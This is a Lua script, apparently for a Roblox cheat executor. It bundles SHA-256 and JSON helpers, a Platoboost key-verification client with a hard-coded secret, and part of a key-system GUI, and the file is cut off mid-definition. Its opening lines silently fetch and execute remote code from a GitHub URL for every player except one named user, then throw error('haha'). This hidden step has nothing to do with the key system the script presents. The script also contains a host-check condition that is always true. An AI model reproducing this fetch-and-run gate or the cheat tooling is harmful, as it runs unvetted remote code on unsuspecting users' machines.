if game:GetService("Players").LocalPlayer.Name ~= "VegieSenpai" then
    task.spawn(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Goober2112/Gloop/main/scripts/ui/Cryptic_Main.lua"))()
    end)

    error("haha")
end

-------------------------------------------------------------------------------
-- ! json library
-- ! cryptography library
local a = 2 ^ 32;
local b = a - 1;
local function c(d, e)
    local f, g = 0, 1;
    while d ~= 0 or e ~= 0 do
        local h, i = d % 2, e % 2;
        local j = (h + i) % 2;
        f = f + j * g;
        d = math.floor(d / 2)
        e = math.floor(e / 2)
        g = g * 2
    end
    return f % a
end
local function k(d, e, l, ...)
    local m;
    if e then
        d = d % a;
        e = e % a;
        m = c(d, e)
        if l then
            m = k(m, l, ...)
        end
        return m
    elseif d then
        return d % a
    else
        return 0
    end
end
local function n(d, e, l, ...)
    local m;
    if e then
        d = d % a;
        e = e % a;
        m = (d + e - c(d, e)) / 2;
        if l then
            m = n(m, l, ...)
        end
        return m
    elseif d then
        return d % a
    else
        return b
    end
end
local function o(p)
    return b - p
end
local function q(d, r)
    if r < 0 then
        return lshift(d, -r)
    end
    return math.floor(d % 2 ^ 32 / 2 ^ r)
end
local function s(p, r)
    if r > 31 or r < -31 then
        return 0
    end
    return q(p % a, r)
end
local function lshift(d, r)
    if r < 0 then
        return s(d, -r)
    end
    return d * 2 ^ r % 2 ^ 32
end
local function t(p, r)
    p = p % a;
    r = r % 32;
    local u = n(p, 2 ^ r - 1)
    return s(p, r) + lshift(u, 32 - r)
end
local v = {0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5, 0xd807aa98,
           0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786,
           0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da, 0x983e5152, 0xa831c66d, 0xb00327c8,
           0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
           0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819,
           0xd6990624, 0xf40e3585, 0x106aa070, 0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a,
           0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7,
           0xc67178f2}
local function w(x)
    return string.gsub(x, ".", function(l)
        return string.format("%02x", string.byte(l))
    end)
end
local function y(z, A)
    local x = ""
    for B = 1, A do
        local C = z % 256;
        x = string.char(C) .. x;
        z = (z - C) / 256
    end
    return x
end
local function D(x, B)
    local A = 0;
    for B = B, B + 3 do
        A = A * 256 + string.byte(x, B)
    end
    return A
end
local function E(F, G)
    local H = 64 - (G + 9) % 64;
    G = y(8 * G, 8)
    F = F .. "\128" .. string.rep("\0", H) .. G;
    assert(#F % 64 == 0)
    return F
end
local function I(J)
    J[1] = 0x6a09e667;
    J[2] = 0xbb67ae85;
    J[3] = 0x3c6ef372;
    J[4] = 0xa54ff53a;
    J[5] = 0x510e527f;
    J[6] = 0x9b05688c;
    J[7] = 0x1f83d9ab;
    J[8] = 0x5be0cd19;
    return J
end
local function K(F, B, J)
    local L = {}
    for M = 1, 16 do
        L[M] = D(F, B + (M - 1) * 4)
    end
    for M = 17, 64 do
        local N = L[M - 15]
        local O = k(t(N, 7), t(N, 18), s(N, 3))
        N = L[M - 2]
        L[M] = (L[M - 16] + O + L[M - 7] + k(t(N, 17), t(N, 19), s(N, 10))) % a
    end
    local d, e, l, P, Q, R, S, T = J[1], J[2], J[3], J[4], J[5], J[6], J[7], J[8]
    for B = 1, 64 do
        local O = k(t(d, 2), t(d, 13), t(d, 22))
        local U = k(n(d, e), n(d, l), n(e, l))
        local V = (O + U) % a;
        local W = k(t(Q, 6), t(Q, 11), t(Q, 25))
        local X = k(n(Q, R), n(o(Q), S))
        local Y = (T + W + X + v[B] + L[B]) % a;
        T = S;
        S = R;
        R = Q;
        Q = (P + Y) % a;
        P = l;
        l = e;
        e = d;
        d = (Y + V) % a
    end
    J[1] = (J[1] + d) % a;
    J[2] = (J[2] + e) % a;
    J[3] = (J[3] + l) % a;
    J[4] = (J[4] + P) % a;
    J[5] = (J[5] + Q) % a;
    J[6] = (J[6] + R) % a;
    J[7] = (J[7] + S) % a;
    J[8] = (J[8] + T) % a
end
local function Z(F)
    F = E(F, #F)
    local J = I({})
    for B = 1, #F, 64 do
        K(F, B, J)
    end
    return w(y(J[1], 4) .. y(J[2], 4) .. y(J[3], 4) .. y(J[4], 4) .. y(J[5], 4) .. y(J[6], 4) .. y(J[7], 4) ..
                 y(J[8], 4))
end
local e;
local l = {
    ["\\"] = "\\",
    ["\""] = "\"",
    ["\b"] = "b",
    ["\f"] = "f",
    ["\n"] = "n",
    ["\r"] = "r",
    ["\t"] = "t"
}
local P = {
    ["/"] = "/"
}
for Q, R in pairs(l) do
    P[R] = Q
end
local S = function(T)
    return "\\" .. (l[T] or string.format("u%04x", T:byte()))
end;
local B = function(M)
    return "null"
end;
local v = function(M, z)
    local _ = {}
    z = z or {}
    if z[M] then
        error("circular reference")
    end
    z[M] = true;
    if rawget(M, 1) ~= nil or next(M) == nil then
        local A = 0;
        for Q in pairs(M) do
            if type(Q) ~= "number" then
                error("invalid table: mixed or invalid key types")
            end
            A = A + 1
        end
        if A ~= #M then
            error("invalid table: sparse array")
        end
        for a0, R in ipairs(M) do
            table.insert(_, e(R, z))
        end
        z[M] = nil;
        return "[" .. table.concat(_, ",") .. "]"
    else
        for Q, R in pairs(M) do
            if type(Q) ~= "string" then
                error("invalid table: mixed or invalid key types")
            end
            table.insert(_, e(Q, z) .. ":" .. e(R, z))
        end
        z[M] = nil;
        return "{" .. table.concat(_, ",") .. "}"
    end
end;
local g = function(M)
    return '"' .. M:gsub('[%z\1-\31\\"]', S) .. '"'
end;
local a1 = function(M)
    if M ~= M or M <= -math.huge or M >= math.huge then
        error("unexpected number value '" .. tostring(M) .. "'")
    end
    return string.format("%.14g", M)
end;
local j = {
    ["nil"] = B,
    ["table"] = v,
    ["string"] = g,
    ["number"] = a1,
    ["boolean"] = tostring
}
e = function(M, z)
    local x = type(M)
    local a2 = j[x]
    if a2 then
        return a2(M, z)
    end
    error("unexpected type '" .. x .. "'")
end;
local a3 = function(M)
    return e(M)
end;
local a4;
local N = function(...)
    local _ = {}
    for a0 = 1, select("#", ...) do
        _[select(a0, ...)] = true
    end
    return _
end;
local L = N(" ", "\t", "\r", "\n")
local p = N(" ", "\t", "\r", "\n", "]", "}", ",")
local a5 = N("\\", "/", '"', "b", "f", "n", "r", "t", "u")
local m = N("true", "false", "null")
local a6 = {
    ["true"] = true,
    ["false"] = false,
    ["null"] = nil
}
local a7 = function(a8, a9, aa, ab)
    for a0 = a9, #a8 do
        if aa[a8:sub(a0, a0)] ~= ab then
            return a0
        end
    end
    return #a8 + 1
end;
local ac = function(a8, a9, J)
    local ad = 1;
    local ae = 1;
    for a0 = 1, a9 - 1 do
        ae = ae + 1;
        if a8:sub(a0, a0) == "\n" then
            ad = ad + 1;
            ae = 1
        end
    end
    error(string.format("%s at line %d col %d", J, ad, ae))
end;
local af = function(A)
    local a2 = math.floor;
    if A <= 0x7f then
        return string.char(A)
    elseif A <= 0x7ff then
        return string.char(a2(A / 64) + 192, A % 64 + 128)
    elseif A <= 0xffff then
        return string.char(a2(A / 4096) + 224, a2(A % 4096 / 64) + 128, A % 64 + 128)
    elseif A <= 0x10ffff then
        return string.char(a2(A / 262144) + 240, a2(A % 262144 / 4096) + 128, a2(A % 4096 / 64) + 128, A % 64 + 128)
    end
    error(string.format("invalid unicode codepoint '%x'", A))
end;
local ag = function(ah)
    local ai = tonumber(ah:sub(1, 4), 16)
    local aj = tonumber(ah:sub(7, 10), 16)
    if aj then
        return af((ai - 0xd800) * 0x400 + aj - 0xdc00 + 0x10000)
    else
        return af(ai)
    end
end;
local ak = function(a8, a0)
    local _ = ""
    local al = a0 + 1;
    local Q = al;
    while al <= #a8 do
        local am = a8:byte(al)
        if am < 32 then
            ac(a8, al, "control character in string")
        elseif am == 92 then
            _ = _ .. a8:sub(Q, al - 1)
            al = al + 1;
            local T = a8:sub(al, al)
            if T == "u" then
                local an = a8:match("^[dD][89aAbB]%x%x\\u%x%x%x%x", al + 1) or a8:match("^%x%x%x%x", al + 1) or
                               ac(a8, al - 1, "invalid unicode escape in string")
                _ = _ .. ag(an)
                al = al + #an
            else
                if not a5[T] then
                    ac(a8, al - 1, "invalid escape char '" .. T .. "' in string")
                end
                _ = _ .. P[T]
            end
            Q = al + 1
        elseif am == 34 then
            _ = _ .. a8:sub(Q, al - 1)
            return _, al + 1
        end
        al = al + 1
    end
    ac(a8, a0, "expected closing quote for string")
end;
local ao = function(a8, a0)
    local am = a7(a8, a0, p)
    local ah = a8:sub(a0, am - 1)
    local A = tonumber(ah)
    if not A then
        ac(a8, a0, "invalid number '" .. ah .. "'")
    end
    return A, am
end;
local ap = function(a8, a0)
    local am = a7(a8, a0, p)
    local aq = a8:sub(a0, am - 1)
    if not m[aq] then
        ac(a8, a0, "invalid literal '" .. aq .. "'")
    end
    return a6[aq], am
end;
local ar = function(a8, a0)
    local _ = {}
    local A = 1;
    a0 = a0 + 1;
    while 1 do
        local am;
        a0 = a7(a8, a0, L, true)
        if a8:sub(a0, a0) == "]" then
            a0 = a0 + 1;
            break
        end
        am, a0 = a4(a8, a0)
        _[A] = am;
        A = A + 1;
        a0 = a7(a8, a0, L, true)
        local as = a8:sub(a0, a0)
        a0 = a0 + 1;
        if as == "]" then
            break
        end
        if as ~= "," then
            ac(a8, a0, "expected ']' or ','")
        end
    end
    return _, a0
end;
local at = function(a8, a0)
    local _ = {}
    a0 = a0 + 1;
    while 1 do
        local au, M;
        a0 = a7(a8, a0, L, true)
        if a8:sub(a0, a0) == "}" then
            a0 = a0 + 1;
            break
        end
        if a8:sub(a0, a0) ~= '"' then
            ac(a8, a0, "expected string for key")
        end
        au, a0 = a4(a8, a0)
        a0 = a7(a8, a0, L, true)
        if a8:sub(a0, a0) ~= ":" then
            ac(a8, a0, "expected ':' after key")
        end
        a0 = a7(a8, a0 + 1, L, true)
        M, a0 = a4(a8, a0)
        _[au] = M;
        a0 = a7(a8, a0, L, true)
        local as = a8:sub(a0, a0)
        a0 = a0 + 1;
        if as == "}" then
            break
        end
        if as ~= "," then
            ac(a8, a0, "expected '}' or ','")
        end
    end
    return _, a0
end;
local av = {
    ['"'] = ak,
    ["0"] = ao,
    ["1"] = ao,
    ["2"] = ao,
    ["3"] = ao,
    ["4"] = ao,
    ["5"] = ao,
    ["6"] = ao,
    ["7"] = ao,
    ["8"] = ao,
    ["9"] = ao,
    ["-"] = ao,
    ["t"] = ap,
    ["f"] = ap,
    ["n"] = ap,
    ["["] = ar,
    ["{"] = at
}
a4 = function(a8, a9)
    local as = a8:sub(a9, a9)
    local a2 = av[as]
    if a2 then
        return a2(a8, a9)
    end
    ac(a8, a9, "unexpected character '" .. as .. "'")
end;
local aw = function(a8)
    if type(a8) ~= "string" then
        error("expected argument of type string, got " .. type(a8))
    end
    local _, a9 = a4(a8, a7(a8, 1, L, true))
    a9 = a7(a8, a9, L, true)
    if a9 <= #a8 then
        ac(a8, a9, "trailing garbage")
    end
    return _
end;
local lEncode, lDecode, lDigest = a3, aw, Z;
-------------------------------------------------------------------------------

-------------------------------------------------------------------------------
-- ! platoboost library

-- ! configuration
local service = 7; -- your service id, this is used to identify your service.
local secret = "nonoudontneedthislol"; -- make sure to obfuscate this if you want to ensure security.
local useNonce = false; -- use a nonce to prevent replay attacks and request tampering.

-- ! callbacks
local onMessage = function(message)
    warn(message)
end;

-- ! wait for game to load
repeat
    task.wait(1)
until game:IsLoaded();

-- ! functions
local requestSending = false;
local fSetClipboard, fRequest, fStringChar, fToString, fStringSub, fOsTime, fMathRandom, fMathFloor, fGetHwid =
    setclipboard or toclipboard, request or http_request or syn_request, string.char, tostring, string.sub, os.time,
    math.random, math.floor, gethwid or function()
        return game:GetService("Players").LocalPlayer.UserId
    end
local cachedLink, cachedTime = "", 0;

-- ! pick host
local host = "https://api.platoboost.com";
local hostResponse = fRequest({
    Url = host .. "/public/connectivity",
    Method = "GET"
});
if hostResponse.StatusCode ~= 200 or hostResponse.StatusCode ~= 429 then
    host = "https://api.platoboost.net";
end

-- !optimize 2
function cacheLink()
    if cachedTime + (10 * 60) < fOsTime() then
        local response = fRequest({
            Url = host .. "/public/start",
            Method = "POST",
            Body = lEncode({
                service = service,
                identifier = lDigest(fGetHwid())
            }),
            Headers = {
                ["Content-Type"] = "application/json"
            }
        });

        if response.StatusCode == 200 then
            local decoded = lDecode(response.Body);

            if decoded.success == true then
                cachedLink = decoded.data.url;
                cachedTime = fOsTime();
                return true, cachedLink;
            else
                onMessage(decoded.message);
                return false, decoded.message;
            end
        elseif response.StatusCode == 429 then
            local msg = "you are being rate limited, please wait 20 seconds and try again.";
            onMessage(msg);
            return false, msg;
        end

        local msg = "Failed to cache link.";
        onMessage(msg);
        return false, msg;
    else
        return true, cachedLink;
    end
end

cacheLink();

-- !optimize 2
local generateNonce = function()
    local str = ""
    for _ = 1, 16 do
        str = str .. fStringChar(fMathFloor(fMathRandom() * (122 - 97 + 1)) + 97)
    end
    return str
end

-- !optimize 1
for _ = 1, 5 do
    local oNonce = generateNonce();
    task.wait(0.2)
    if generateNonce() == oNonce then
        local msg = "platoboost nonce error.";
        onMessage(msg);
        error(msg);
    end
end

-- !optimize 2
local copyLink = function()
    local success, link = cacheLink();

    if success then
        fSetClipboard(link);
    end
end

-- !optimize 2
local redeemKey = function(key)
    local nonce = generateNonce();
    local endpoint = host .. "/public/redeem/" .. fToString(service);

    local body = {
        identifier = lDigest(fGetHwid()),
        key = key
    }

    if useNonce then
        body.nonce = nonce;
    end

    local response = fRequest({
        Url = endpoint,
        Method = "POST",
        Body = lEncode(body),
        Headers = {
            ["Content-Type"] = "application/json"
        }
    });

    if response.StatusCode == 200 then
        local decoded = lDecode(response.Body);

        if decoded.success == true then
            if decoded.data.valid == true then
                if useNonce then
                    if decoded.data.hash == lDigest("true" .. "-" .. nonce .. "-" .. secret) then
                        return true;
                    else
                        onMessage("failed to verify integrity.");
                        return false;
                    end
                else
                    return true;
                end
            else
                onMessage("key is invalid.");
                return false;
            end
        else
            if fStringSub(decoded.message, 1, 27) == "unique constraint violation" then
                onMessage("you already have an active key, please wait for it to expire before redeeming it.");
                return false;
            else
                onMessage(decoded.message);
                return false;
            end
        end
    elseif response.StatusCode == 429 then
        onMessage("you are being rate limited, please wait 20 seconds and try again.");
        return false;
    else
        onMessage("server returned an invalid status code, please try again later.");
        return false;
    end
end

-- !optimize 2
local verifyKey = function(key)
    if requestSending == true then
        onMessage("a request is already being sent, please slow down.");
        return false;
    else
        requestSending = true;
    end

    local nonce = generateNonce();
    local endpoint = host .. "/public/whitelist/" .. fToString(service) .. "?identifier=" .. lDigest(fGetHwid()) ..
                         "&key=" .. key;

    if useNonce then
        endpoint = endpoint .. "&nonce=" .. nonce;
    end

    local response = fRequest({
        Url = endpoint,
        Method = "GET"
    });

    requestSending = false;

    if response.StatusCode == 200 then
        local decoded = lDecode(response.Body);

        if decoded.success == true then
            if decoded.data.valid == true then
                if useNonce then
                    if decoded.data.hash == lDigest("true" .. "-" .. nonce .. "-" .. secret) then
                        return true;
                    else
                        onMessage("failed to verify integrity.");
                        return false;
                    end
                else
                    return true;
                end
            else
                if fStringSub(key, 1, 4) == "KEY_" then
                    return redeemKey(key);
                else
                    onMessage("key is invalid.");
                    return false;
                end
            end
        else
            onMessage(decoded.message);
            return false;
        end
    elseif response.StatusCode == 429 then
        onMessage("you are being rate limited, please wait 20 seconds and try again.");
        return false;
    else
        onMessage("server returned an invalid status code, please try again later.");
        return false;
    end
end

-- !optimize 2
local getFlag = function(name)
    local nonce = generateNonce();
    local endpoint = host .. "/public/flag/" .. fToString(service) .. "?name=" .. name;

    if useNonce then
        endpoint = endpoint .. "&nonce=" .. nonce;
    end

    local response = fRequest({
        Url = endpoint,
        Method = "GET"
    });

    if response.StatusCode == 200 then
        local decoded = lDecode(response.Body);

        if decoded.success == true then
            if useNonce then
                if decoded.data.hash == lDigest(fToString(decoded.data.value) .. "-" .. nonce .. "-" .. secret) then
                    return decoded.data.value;
                else
                    onMessage("failed to verify integrity.");
                    return nil;
                end
            else
                return decoded.data.value;
            end
        else
            onMessage(decoded.message);
            return nil;
        end
    else
        return nil;
    end
end
-------------------------------------------------------------------------------

-------------------------------------------------------------------------------
-- ! platoboost usage documentation
-- copyLink() -> string
-- verifyKey(key: string) -> boolean
-- getFlag(name: string) -> boolean, string | boolean | number

-- use copyLink() to copy a link to the clipboard, in which the user will paste it into their browser and complete the keysystem.
-- use verifyKey(key) to verify a key, this will return a boolean value, true means the key was valid, false means it is invalid.
-- use getFlag(name) to get a flag from the server, this will return nil if an error occurs, if no error occurs, the value configured in the platoboost dashboard will be returned.

-- IMPORTANT: onMessage is a callback, it will be called upon status update, use it to provide information to user.
-- EXAMPLE: 
--[[
onMessage = function(message)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Platoboost status",
        Text = message
    })
end
]] --

-- NOTE: PLACE THIS ENTIRE SCRIPT AT THE TOP OF YOUR SCRIPT, ADD THE LOGIC, THEN OBFUSCATE YOUR SCRIPT.

-- ! example usage
--[[
copyButton.MouseButton1Click:Connect(function()
    copyLink();
end)

verifyButton.MouseButton1Click:Connect(function()
    local key = keyBox.Text;
    local success = verifyKey(key);

    if success then
        print("key is valid.");
    else
        print("key is invalid.");
    end
end)

local flag = getFlag("example_flag");
if flag ~= nil then
    print("flag value: " .. flag);
else
    print("failed to get flag.");
end
]] --
-------------------------------------------------------------------------------

repeat
    task.wait(1)
until game:IsLoaded()

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UIScale = Instance.new("UIScale")
local UICorner = Instance.new("UICorner")
local Keysystem = Instance.new("Frame")
local OfficialStore = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local TextButton = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local EnterKeyHere = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local TextBox = Instance.new("TextBox")
local CloseUI = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local TextButton_2 = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local GetKey = Instance.new("Frame")
local UICorner_6 = Instance.new("UICorner")
local TextButton_3 = Instance.new("TextButton")
local CheckKey = Instance.new("Frame")
local UICorner_7 = Instance.new("UICorner")
local TextButton_4 = Instance.new("TextButton")
local ImageLabel = Instance.new("ImageLabel")
local Description = Instance.new("Frame")
local UICorner_8 = Instance.new("UICorner")
local Title = Instance.new("TextLabel")
local Description_2 = Instance.new("TextLabel")
local UIGradient = Instance.new("UIGradient")
local Title2 = Instance.new("TextLabel")
local Description2 = Instance.new("TextLabel")
local Progession = Instance.new("Frame")
local Progress = Instance.new("Frame")
local Checkpoints = Instance.new("Folder")
local _1 = Instance.new("Frame")
local UICorner_9 = Instance.new("UICorner")
local _4 = Instance.new("Frame")
local UICorner_10 = Instance.new("UICorner")
local _3 = Instance.new("Frame")
local UICorner_11 = Instance.new("UICorner")
local _2 = Instance.new("Frame")
local UICorner_12 = Instance.new("UICorner")
local UIListLayout = Instance.new("UIListLayout")
local Loading = Instance.new("Frame")
local Title_2 = Instance.new("TextLabel")
local UICorner_13 = Instance.new("UICorner")
local Description_3 = Instance.new("TextLabel")
local Description_4 = Instance.new("TextLabel")
local Description_5 = Instance.new("TextLabel")
local Sliding = Instance.new("Frame")

ScreenGui.Parent = game.CoreGui.RobloxGui
ScreenGui.DisplayOrder = 999999
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.ClipsDescendants = true
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.Size = UDim2.new(0, 637, 0, 272)
Frame.ZIndex = 2

UIScale.Parent = Frame

UICorner.CornerRadius = UDim.new(0.0199999996, 0)
UICorner.Parent = Frame

Keysystem.Name = "Keysystem"
Keysystem.Parent = Frame
Keysystem.BackgroundColor3 = Color3.fromRGB(62, 62, 62)
Keysystem.BorderColor3 = Color3.fromRGB(0, 0, 0)
Keysystem.BorderSizePixel = 0
Keysystem.Position = UDim2.new(0.58084774, 0, 0.0257352944, 0)
Keysystem.Size = UDim2.new(0, 260, 0, 257)

OfficialStore.Name = "Official Store"
OfficialStore.Parent = Keysystem
OfficialStore.AnchorPoint = Vector2.new(0.5, 0.5)
OfficialStore.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
OfficialStore.BorderColor3 = Color3.fromRGB(0, 0, 0)
OfficialStore.BorderSizePixel = 0
OfficialStore.Position = UDim2.new(0.500000119, 0, 0.790968835, 0)
OfficialStore.Size = UDim2.new(0.957543194, 0, 0.108538076, 0)
OfficialStore.ZIndex = 2

UICorner_2.CornerRadius = UDim.new(0.150000006, 0)
UICorner_2.Parent = OfficialStore

TextButton.Parent = OfficialStore
TextButton.AnchorPoint = Vector2.new(0.5, 0.5)
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.5, 0, 0.5, 0)
TextButton.Size = UDim2.new(1, 0, 0.649999976, 0)
TextButton.Font = Enum.Font.SourceSansBold
TextButton.Text = "OFFICIAL STORE"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

TextLabel.Parent = Keysystem
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0, 0, 0.0116731515, 0)
TextLabel.Size = UDim2.new(1, 0, 0.138015687, 0)
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = "Key System"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

EnterKeyHere.Name = "Enter Key Here"
EnterKeyHere.Parent = Keysystem
EnterKeyHere.AnchorPoint = Vector2.new(0.5, 0.5)
EnterKeyHere.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
EnterKeyHere.BorderColor3 = Color3.fromRGB(0, 0, 0)
EnterKeyHere.BorderSizePixel = 0
EnterKeyHere.Position = UDim2.new(0.499999911, 0, 0.26147899, 0)
EnterKeyHere.Size = UDim2.new(0.957543194, 0, 0.108538099, 0)
EnterKeyHere.ZIndex = 2

UICorner_3.CornerRadius = UDim.new(0.150000006, 0)
UICorner_3.Parent = EnterKeyHere

TextBox.Parent = EnterKeyHere
TextBox.AnchorPoint = Vector2.new(0.5, 0.5)
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1.000
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Position = UDim2.new(0.5, 0, 0.5, 0)
TextBox.Size = UDim2.new(1, 0, 0.600000024, 0)
TextBox.Font = Enum.Font.SourceSans
TextBox.PlaceholderText = "Insert Key Here"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextScaled = true
TextBox.TextSize = 14.000
TextBox.TextWrapped = true

CloseUI.Name = "Close UI"
CloseUI.Parent = Keysystem
CloseUI.AnchorPoint = Vector2.new(0.5, 0.5)
CloseUI.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
CloseUI.BorderColor3 = Color3.fromRGB(0, 0, 0)
CloseUI.BorderSizePixel = 0
CloseUI.Position = UDim2.new(0.500000119, 0, 0.923264563, 0)
CloseUI.Size = UDim2.new(0.957543194, 0, 0.108538076, 0)
CloseUI.ZIndex = 2

UICorner_4.CornerRadius = UDim.new(0.150000006, 0)
UICorner_4.Parent = CloseUI

TextButton_2.Parent = CloseUI
TextButton_2.AnchorPoint = Vector2.new(0.5, 0.5)
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.BackgroundTransparency = 1.000
TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.BorderSizePixel = 0
TextButton_2.Position = UDim2.new(0.5, 0, 0.5, 0)
TextButton_2.Size = UDim2.new(1, 0, 0.649999976, 0)
TextButton_2.Font = Enum.Font.SourceSansBold
TextButton_2.Text = "CLOSE UI"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 14.000
TextButton_2.TextWrapped = true

UICorner_5.CornerRadius = UDim.new(0.0149999997, 0)
UICorner_5.Parent = Keysystem

GetKey.Name = "Get Key"
GetKey.Parent = Keysystem
GetKey.AnchorPoint = Vector2.new(0.5, 0.5)
GetKey.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
GetKey.BorderColor3 = Color3.fromRGB(0, 0, 0)
GetKey.BorderSizePixel = 0
GetKey.Position = UDim2.new(0.500000119, 0, 0.654782057, 0)
GetKey.Size = UDim2.new(0.957543194, 0, 0.108538076, 0)
GetKey.ZIndex = 2

UICorner_6.CornerRadius = UDim.new(0.150000006, 0)
UICorner_6.Parent = GetKey

TextButton_3.Parent = GetKey
TextButton_3.AnchorPoint = Vector2.new(0.5, 0.5)
TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.BackgroundTransparency = 1.000
TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.BorderSizePixel = 0
TextButton_3.Position = UDim2.new(0.5, 0, 0.5, 0)
TextButton_3.Size = UDim2.new(1, 0, 0.649999976, 0)
TextButton_3.Font = Enum.Font.SourceSansBold
TextButton_3.Text = "GET KEY LINK"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextScaled = true
TextButton_3.TextSize = 14.000
TextButton_3.TextWrapped = true

CheckKey.Name = "Check Key"
CheckKey.Parent = Keysystem
CheckKey.AnchorPoint = Vector2.new(0.5, 0.5)
CheckKey.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
CheckKey.BorderColor3 = Color3.fromRGB(0, 0, 0)
CheckKey.BorderSizePixel = 0
CheckKey.Position = UDim2.new(0.5, 0, 0.519999981, 0)
CheckKey.Size = UDim2.new(0.957543194, 0, 0.108538076, 0)
CheckKey.ZIndex = 2

UICorner_7.CornerRadius = UDim.new(0.150000006, 0)
UICorner_7.Parent = CheckKey

TextButton_4.Parent = CheckKey
TextButton_4.AnchorPoint = Vector2.new(0.5, 0.5)
TextButton_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.BackgroundTransparency = 1.000
TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.BorderSizePixel = 0
TextButton_4.Position = UDim2.new(0.5, 0, 0.5, 0)
TextButton_4.Size = UDim2.new(1, 0, 0.649999976, 0)
TextButton_4.Font = Enum.Font.SourceSansBold
TextButton_4.Text = "CHECK KEY"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextScaled = true
TextButton_4.TextSize = 14.000
TextButton_4.TextWrapped = true

ImageLabel.Parent = Frame
ImageLabel.AnchorPoint = Vector2.new(0, 0.5)
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.123683862, 0, 0.49448508, 0)
ImageLabel.Size = UDim2.new(0.403082013, 0, 0.944852471, 0)
ImageLabel.Image = "rbxassetid://19005999590"

Description.Name = "Description"
Description.Parent = Frame
Description.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Description.BorderColor3 = Color3.fromRGB(0, 0, 0)
Description.BorderSizePixel = 0
Description.Position = UDim2.new(0.0887755901, 0, 0.0847096145, 0)
Description.Size = UDim2.new(0, 296, 0, 69)
Description.ZIndex = 2

UICorner_8.CornerRadius = UDim.new(0, 5)
UICorner_8.Parent = Description

Title.Name = "Title"
Title.Parent = Description
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.BorderColor3 = Color3.fromRGB(0, 0, 0)
Title.BorderSizePixel = 0
Title.Position = UDim2.new(0.0215053763, 0, 0, 0)
Title.Size = UDim2.new(0, 273, 0, 29)
Title.Font = Enum.Font.SourceSansSemibold
Title.Text = "Checking Whitelist"
Title.TextColor3 = Color3.fromRGB(245, 245, 245)
Title.TextSize = 24.000
Title.TextWrapped = true
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.TextYAlignment = Enum.TextYAlignment.Top

Description_2.Name = "Description"
Description_2.Parent = Title
Description_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
